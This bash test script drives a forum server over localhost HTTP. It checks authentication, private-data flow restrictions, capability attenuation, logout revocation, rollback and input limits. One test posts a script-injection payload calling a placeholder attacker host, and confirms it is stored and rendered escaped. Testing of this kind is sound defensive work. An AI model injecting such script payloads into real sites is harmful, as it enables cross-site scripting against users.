#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."
runner=${1:-bin/verified-forum}
port=${PROGRAM_TEST_PORT:-18085}
base="http://127.0.0.1:$port"
mkdir -p build/program-http evidence
printf '[]\n' > evidence/program-http-tests.json
"$runner" "$port" > build/program-http/server.log 2>&1 &
server_pid=$!
trap 'kill "$server_pid" 2>/dev/null || true; wait "$server_pid" 2>/dev/null || true' EXIT
ready=false
for ((i=0;i<50;i++)); do
  if curl -sf --max-time 1 "$base/posts" > build/program-http/initial.json; then ready=true; break; fi
  sleep 0.1
done
[[ $ready == true ]] || { cat build/program-http/server.log >&2; exit 1; }
expect() {
  local expected=$1 name=$2 data=$3 token=${4:-} endpoint=${5:-program}
  local args=(-sS --max-time 4 -o build/program-http/response.json -w '%{http_code}'
    -H 'Content-Type: application/json' --data-binary "$data")
  [[ -z $token ]] || args+=(-H "Authorization: Bearer $token")
  local status
  status=$(curl "${args[@]}" "$base/$endpoint")
  jq --arg name "$name" --arg expected "$expected" --arg actual "$status" --arg request "$data" \
    --slurpfile response build/program-http/response.json \
    '. + [{name:$name,expected:$expected,actual:$actual,passed:($expected==$actual),request:$request,response:$response[0]}]' \
    evidence/program-http-tests.json > build/program-http/next.json
  mv build/program-http/next.json evidence/program-http-tests.json
  if [[ $status != "$expected" ]]; then
    printf 'FAIL %s: expected %s got %s\n' "$name" "$expected" "$status" >&2
    cat build/program-http/response.json >&2; exit 1
  fi
  printf 'PASS %s (%s)\n' "$name" "$status"
}
expect 401 'anonymous program cannot create' '{"budget":1,"program":{"op":"create","value":{"text":"no"}}}'
expect 403 'anonymous cannot inspect Alice private data' '{"budget":1,"program":{"op":"inspect","value":{"private":"alice"}}}'
expect 401 'login needs a server-validated offer' '{"budget":1,"program":{"op":"login"}}'
expect 400 'caller cannot supply a grant' '{"budget":1,"authority":"Editor","program":{"done":true}}'
expect 401 'invalid credentials cannot seed authority' '{"budget":1,"credentials":{"user":"alice","password":"wrong"},"program":{"op":"login"}}'
expect 200 'authenticated multi-action program and own private result' '{"budget":4,"credentials":{"user":"alice","password":"alice-demo"},"program":{"op":"login","next":{"op":"create","value":{"text":"Alice public post"},"next":{"op":"inspect","value":{"private":"alice"},"next":{"op":"read"}}}}}'
alice=$(jq -er .token build/program-http/response.json)
jq -e '.steps==4 and .trace[2].kind=="private" and .trace[2].owner=="alice" and .trace[2].body=="Alice private draft: alpha"' build/program-http/response.json >/dev/null
curl -sf "$base/posts" > build/program-http/protected.json
expect 403 'private data cannot flow into public post' '{"budget":1,"program":{"op":"create","value":{"private":"alice"}}}' "$alice"
jq -e '.error=="SecretSink"' build/program-http/response.json >/dev/null
expect 403 'private value cannot control a public branch' '{"budget":2,"program":{"if":{"private":"alice"},"then":{"op":"create","value":{"text":"bit 1"}},"else":{"op":"create","value":{"text":"bit 0"}}}}' "$alice"
jq -e '.error=="SecretControl"' build/program-http/response.json >/dev/null
expect 403 'Alice cannot inspect Bob private data' '{"budget":1,"program":{"op":"inspect","value":{"private":"bob"}}}' "$alice"
expect 200 'Bob can inspect own private data' '{"budget":2,"credentials":{"user":"bob","password":"bob-demo"},"program":{"op":"login","next":{"op":"inspect","value":{"private":"bob"}}}}'
bob=$(jq -er .token build/program-http/response.json)
jq -e '.trace[1].owner=="bob" and .trace[1].body=="Bob private draft: beta"' build/program-http/response.json >/dev/null
expect 403 'Bob cannot edit Alice public post' '{"budget":1,"program":{"op":"edit","id":0,"value":{"text":"stolen"}}}' "$bob"
expect 403 'Bob cannot inspect Alice private data' '{"budget":1,"program":{"op":"inspect","value":{"private":"alice"}}}' "$bob"
expect 200 'owner can edit own public post' '{"budget":1,"program":{"op":"edit","id":0,"value":{"text":"owner edit"}}}' "$alice"
curl -sf "$base/posts" > build/program-http/protected.json
expect 409 'invalid transition rolls back an earlier valid write' '{"budget":2,"program":{"op":"create","value":{"text":"must roll back"},"next":{"op":"login"}}}' "$bob"
curl -sf "$base/posts" > build/program-http/after.json
cmp build/program-http/protected.json build/program-http/after.json
expect 429 'budget exhaustion rolls back partial execution' '{"budget":1,"program":{"op":"create","value":{"text":"must roll back"},"next":{"op":"read"}}}' "$bob"
jq -e '.error=="Exhausted"' build/program-http/response.json >/dev/null
curl -sf "$base/posts" > build/program-http/after.json
cmp build/program-http/protected.json build/program-http/after.json
expect 200 'attenuation reduces write capability' '{"budget":1,"program":{"op":"restrict"}}' "$alice"
jq -e '.context.writeOwn==false' build/program-http/response.json >/dev/null
expect 403 'attenuated program cannot publish' '{"budget":1,"program":{"op":"create","value":{"text":"restore writer"}}}' "$alice"
expect 403 'legacy endpoint cannot bypass attenuation' '{"op":"create","body":"bypass"}' "$alice" command
expect 403 'legacy own edit cannot bypass attenuation' '{"op":"edit","id":0,"body":"bypass"}' "$alice" command
expect 409 'repeated login cannot restore writer rights' '{"budget":1,"program":{"op":"login"}}' "$alice"
expect 400 'program cannot name a stronger rank' '{"budget":1,"program":{"op":"restrict","rank":"Editor"}}' "$alice"
expect 200 'viewer retains own private read access' '{"budget":1,"program":{"op":"inspect","value":{"private":"alice"}}}' "$alice"
expect 200 'successful logout revokes token' '{"budget":1,"program":{"op":"logout"}}' "$alice"
expect 401 'program rejects replay after successful logout' '{"budget":1,"program":{"op":"create","value":{"text":"replay"}}}' "$alice"
expect 401 'legacy endpoint rejects replay after successful logout' '{"op":"create","body":"replay"}' "$alice" command
expect 401 'consumed login offer cannot be reused after logout' '{"budget":3,"credentials":{"user":"alice","password":"alice-demo"},"program":{"op":"login","next":{"op":"logout","next":{"op":"login"}}}}'
jq -e '.error=="NoLoginOffer"' build/program-http/response.json >/dev/null
expect 200 'fresh validated authentication can issue new rights' '{"budget":1,"credentials":{"user":"alice","password":"alice-demo"},"program":{"op":"login"}}'
alice=$(jq -er .token build/program-http/response.json)
expect 200 'public literal condition selects an existing branch' '{"budget":2,"program":{"if":{"text":""},"then":{"op":"read"},"else":{"op":"logout"}}}' "$alice"
jq -e '.steps==2 and .trace[0].kind=="branch" and .trace[0].empty==true and .trace[1].kind=="read"' build/program-http/response.json >/dev/null
attack='{"op":"login","authority":"Editor"}<script>fetch("https://attacker.invalid")</script>'
payload=$(jq -nc --arg text "$attack" '{budget:1,program:{op:"create",value:{text:$text}}}')
expect 200 'embedded commands and scripts remain post data' "$payload" "$alice"
jq -e '.steps==1 and (.trace|length)==1 and .trace[0].kind=="created"' build/program-http/response.json >/dev/null
curl -sf "$base/" > evidence/program-attack-rendered.html
grep -Fq '&lt;script&gt;' evidence/program-attack-rendered.html
if grep -Fiq '<script' evidence/program-attack-rendered.html; then echo 'FAIL raw script markup' >&2; exit 1; fi
for op in fetch shell sql eval loop; do
  request=$(jq -nc --arg op "$op" '{budget:1,program:{op:$op}}')
  expect 400 "unsupported operation $op cannot enter language" "$request" "$alice"
done
expect 400 'malformed JSON cannot bypass checker' '{'
expect 400 'ambiguous public/private expression rejected' '{"budget":1,"program":{"op":"create","value":{"text":"x","private":"alice"}}}' "$alice"
expect 400 'negative execution budget rejected' '{"budget":-1,"program":{"done":true}}'
expect 400 'budget above server limit rejected' '{"budget":33,"program":{"done":true}}'
expect 400 'fractional budget rejected' '{"budget":1.5,"program":{"done":true}}'
expect 400 'fractional post id rejected' '{"budget":1,"program":{"op":"edit","id":0.5,"value":{"text":"x"}}}' "$alice"
expect 400 'unsupported payload type rejected' '{"budget":1,"program":{"op":"create","value":{"text":[1,2]}}}' "$alice"
deep='{"done":true}'
for ((i=0;i<30;i++)); do deep=$(jq -nc --argjson next "$deep" '{op:"read",next:$next}'); done
deep_request=$(jq -nc --argjson p "$deep" '{budget:32,program:$p}')
expect 400 'excessive program nesting rejected before JSON interpretation' "$deep_request" "$alice"
wide='{"done":true}'
for ((i=0;i<7;i++)); do wide=$(jq -nc --argjson p "$wide" '{if:{text:""},then:$p,else:$p}'); done
wide_request=$(jq -nc --argjson p "$wide" '{budget:32,program:$p}')
expect 400 'excessive AST node count rejected within byte and depth limits' "$wide_request" "$alice"
jq -e '.error | contains("128 nodes")' build/program-http/response.json >/dev/null
large=$(jq -nc '{budget:1,program:{op:"create",value:{text:("x"*17000)}}}')
expect 413 'oversized program request rejected while streaming' "$large" "$alice"
expect 200 'empty program needs no fuel' '{"budget":0,"program":{"done":true}}'
expect 429 'nonempty program requires fuel' '{"budget":0,"program":{"op":"read"}}'
jq -e 'all(.[];.passed)' evidence/program-http-tests.json >/dev/null
printf 'All program HTTP checks passed: %s command responses, plus state rollback, trace and escaping assertions.\n' "$(jq length evidence/program-http-tests.json)"
